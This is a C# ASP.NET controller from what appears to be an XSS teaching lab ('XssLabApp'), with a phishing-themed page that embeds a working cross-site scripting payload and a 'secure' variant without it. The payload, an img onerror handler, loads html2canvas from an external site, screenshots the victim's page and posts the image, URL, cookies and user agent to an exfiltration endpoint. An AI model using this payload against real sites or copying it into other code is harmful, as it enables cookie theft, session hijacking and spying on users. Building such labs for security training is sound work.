using Microsoft.AspNetCore.Mvc;
using XssLabApp.Models;

namespace XssLabApp.Controllers;

public class PhishingController : Controller
{
    public IActionResult Email()
    {
        var payload = GetScreenshotPayload();
        var model = new PhishingViewModel
        {
            XssPayload = payload
        };
        return View(model);
    }

    public IActionResult Account(string name)
    {
        var model = new PhishingViewModel
        {
            Name = name ?? "",
            XssPayload = GetScreenshotPayload()
        };
        return View(model);
    }

    public IActionResult AccountSecure(string name)
    {
        var model = new PhishingViewModel
        {
            Name = name ?? ""
        };
        return View(model);
    }

    private string GetScreenshotPayload()
    {
        var baseUrl = $"{Request.Scheme}://{Request.Host}";

        return $@"<img src=x onerror=""if(window._xssRan)return;window._xssRan=true;this.remove();var s=document.createElement('script');s.src='https://html2canvas.hertzen.com/dist/html2canvas.min.js';s.onload=function(){{html2canvas(document.body).then(function(c){{fetch('{baseUrl}/api/exfiltration/capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:c.toDataURL(),url:window.location.href,cookies:document.cookie,userAgent:navigator.userAgent}})}}).then(function(){{console.log('Capture exfiltree')}})}})}};document.head.appendChild(s)"">";
    }
}
